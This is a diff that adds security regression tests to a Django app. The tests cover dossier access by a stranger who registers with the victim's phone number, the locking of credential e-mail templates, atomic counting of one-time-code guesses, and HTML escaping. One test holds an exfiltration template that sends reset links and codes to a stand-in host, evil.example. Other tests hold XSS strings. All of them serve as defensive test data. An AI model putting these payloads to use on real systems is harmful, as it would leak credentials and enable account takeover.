@@ -353,3 +353,118 @@ def test_real_ip_header_only_trusted_when_configured(rf, settings):
     assert seen["ip"] == "203.0.113.7"
     mw(rf.get("/", HTTP_X_REAL_IP="not-an-ip"))
     assert seen["ip"] == "127.0.0.1"
+
+
+# ------------------------------------------------------------------ audit 2026-11-03
+def _portal_client(email, monkeypatch):
+    from django.core.cache import cache
+    from rest_framework.test import APIClient
+
+    cache.clear()
+    client = APIClient(enforce_csrf_checks=True)
+    sent = {}
+    monkeypatch.setattr("apps.sso.account._send_code", lambda e, code: sent.update(code=code))
+    token = client.get("/api/v1/auth/csrf/").json()["csrfToken"]
+    client.post("/api/v1/public/account/send-code/", {"email": email}, format="json", HTTP_X_CSRFTOKEN=token)
+    res = client.post(
+        "/api/v1/public/account/verify/",
+        {"email": email, "code": sent["code"]},
+        format="json",
+        HTTP_X_CSRFTOKEN=token,
+    )
+    assert res.status_code == 200
+    return client, token
+
+
+def test_someone_elses_phone_never_opens_their_enrolment_file(api, registration_payload, monkeypatch):
+    """A stranger registers with the victim's phone and their own e-mail: the record matched by phone
+    must stay closed (identity number, addresses, CV) in the learner portal."""
+    from datetime import date
+
+    victim_res = api.post("/api/v1/public/registrations/", registration_payload, format="json")
+    victim = Order.objects.get(order_code=victim_res.json()["registrationCode"]).learner
+    victim.birth_date, victim.permanent_address, victim.citizen_id = (
+        date(2001, 2, 3),
+        "12 Phố Huế",
+        "001201000777",
+    )
+    victim.save()
+
+    attacker_payload = {**registration_payload, "customerEmail": "attacker@example.com", "customerName": "X"}
+    res = api.post("/api/v1/public/registrations/", attacker_payload, format="json")
+    order = Order.objects.get(order_code=res.json()["registrationCode"])
+    assert order.learner_id == victim.pk  # staff still see the phone match (duplicate detection)
+
+    client, token = _portal_client("attacker@example.com", monkeypatch)
+    account = client.get("/api/v1/public/account/").json()
+    assert "birth_date" in account["orders"][0]["dossierMissing"]  # nothing learnt from the victim's file
+    url = f"/api/v1/public/account/orders/{order.order_code}/dossier/"
+    data = client.get(url).json()
+    assert data["birthDate"] is None and data["permanentAddress"] == "" and data["citizenIdMasked"] == ""
+    client.put(url, {"permanentAddress": "overwritten"}, format="json", HTTP_X_CSRFTOKEN=token)
+
+    victim.refresh_from_db()
+    order.refresh_from_db()
+    assert victim.permanent_address == "12 Phố Huế" and victim.citizen_id == "001201000777"
+    assert order.learner_id != victim.pk and order.learner.email == "attacker@example.com"
+
+
+def test_the_learner_still_sees_their_own_file(api, registration_payload, monkeypatch):
+    res = api.post("/api/v1/public/registrations/", registration_payload, format="json")
+    order = Order.objects.get(order_code=res.json()["registrationCode"])
+    order.learner.permanent_address = "12 Phố Huế"
+    order.learner.save()
+    client, _ = _portal_client(registration_payload["customerEmail"], monkeypatch)
+    data = client.get(f"/api/v1/public/account/orders/{order.order_code}/dossier/").json()
+    assert data["permanentAddress"] == "12 Phố Huế"
+    order.refresh_from_db()
+    assert order.learner.permanent_address == "12 Phố Huế"
+
+
+@pytest.mark.parametrize("code", ["staff_password_reset", "auth_otp"])
+def test_credential_email_templates_cannot_be_changed_by_staff(staff_client, code):
+    """Otherwise a consultant could make the super admin's reset link or a sign-in code reach them."""
+    from apps.notifications.models import EmailTemplate
+
+    template = EmailTemplate.objects.create(code=code, name=code, subject="S", body="<p>{{reset_link}}</p>")
+    client = staff_client(Role.SALES_CRM)
+    evil = {"body": '<img src="https://evil.example/?{{reset_link}}{{code}}">'}
+    assert (
+        client.patch(f"/api/v1/staff/email-templates/{template.pk}/", evil, format="json").status_code == 400
+    )
+    assert client.delete(f"/api/v1/staff/email-templates/{template.pk}/").status_code == 400
+    other = client.post(
+        "/api/v1/staff/email-templates/", {"code": code + "_x", "name": "x", "subject": "s", "body": "b"}
+    )
+    assert other.status_code == 201
+    renamed = client.patch(
+        f"/api/v1/staff/email-templates/{other.json()['id']}/", {"code": code}, format="json"
+    )
+    assert renamed.status_code == 400
+    template.refresh_from_db()
+    assert "evil" not in template.body
+
+
+def test_one_time_code_guesses_are_counted_atomically():
+    """Parallel requests cannot all read "0 attempts": every guess takes its own slot."""
+    from django.core.cache import cache
+
+    from apps.sso import services
+
+    cache.clear()
+    code = services.issue_otp("hv@example.com")
+    wrong = "000000" if code != "000000" else "111111"
+    record = cache.get(f"sso:otp:{services._h('hv@example.com')}")
+    # Simulate stale readers: the record itself never changes between guesses.
+    for _ in range(services.OTP_MAX_ATTEMPTS):
+        assert services.check_otp("hv@example.com", wrong) is False
+        assert cache.get(f"sso:otp:{services._h('hv@example.com')}") == record
+    assert services.check_otp("hv@example.com", code) is False
+
+
+def test_bot_page_escapes_course_text(client, course):
+    course.description = "&lt;script&gt;alert(1)&lt;/script&gt; <b>RM</b>"
+    course.level = "<img src=x onerror=alert(1)>"
+    course.save()
+    html = client.get(f"/_seo/khoa-hoc/{course.slug}").content.decode()
+    assert "<script>alert" not in html and "<img src=x" not in html
